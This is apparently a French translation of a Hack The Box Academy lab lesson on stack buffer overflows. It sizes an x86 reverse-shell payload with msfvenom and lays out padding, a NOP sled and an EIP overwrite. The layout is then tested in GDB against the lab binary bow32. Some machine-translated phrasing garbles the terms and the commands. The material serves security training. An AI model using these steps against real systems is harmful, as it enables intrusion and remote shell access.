Déterminer la longueur du shellcode
==================================

* * * * *

Maintenant, nous devons découvrir combien d'espace nous avons pour que notre shellcode effectue l'action que nous voulons. Il est à la mode et utile pour nous d'exploiter une telle vulnérabilité pour obtenir un reverse shell. Tout d'abord, nous devons déterminer approximativement la taille de notre shellcode que nous allons insérer, et pour cela, nous utiliserons `msfvenom`.

#### Shellcode - Longueur

Shellcode - Longueur

```
dsgsec@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c

Aucun encodeur ou badchars spécifié, sortie de charge utile brute
Taille de la charge utile : 68 octets
<SNIP>

```

Nous savons maintenant que notre charge utile sera d'environ 68 octets. Par précaution, nous devrions essayer de prendre une plage plus large si le shellcode augmente en raison de spécifications ultérieures.

Souvent, il peut être utile d'insérer une `no operation instruction` (`NOPS`) avant que notre shellcode ne commence afin qu'il puisse être exécuté proprement. Résumons brièvement ce dont nous avons besoin pour cela :

1. Nous avons besoin d'un total de 1 040 octets pour accéder à `EIP`.
2. Ici, nous pouvons utiliser `100 octets` de `NOP` supplémentaires
3. `150 octets` pour notre `shellcode`.

Shellcode - Longueur

```
    Tampon = "\x55" * (1040 - 100 - 150 - 4) = 786
      NOP = "\x90" * 100
Shellcode = "\x44" * 150
       EIP = "\x66" * 4'

```

#### Amortir

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_8.png)

Maintenant, nous pouvons essayer de savoir de combien d'espace nous disposons pour insérer notre shellcode.

#### GDB

GDB

```
(gdb) exécutez $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')

Le programme en cours de débogage a déjà été lancé.
Commencer depuis le début ? (o ou n) o

Programme de démarrage : /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66 " * 4')
Le programme a reçu le signal SIGSEGV, Défaut de segmentation.
0x66666666 en ?? ()

```

#### Amortir

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_7.png)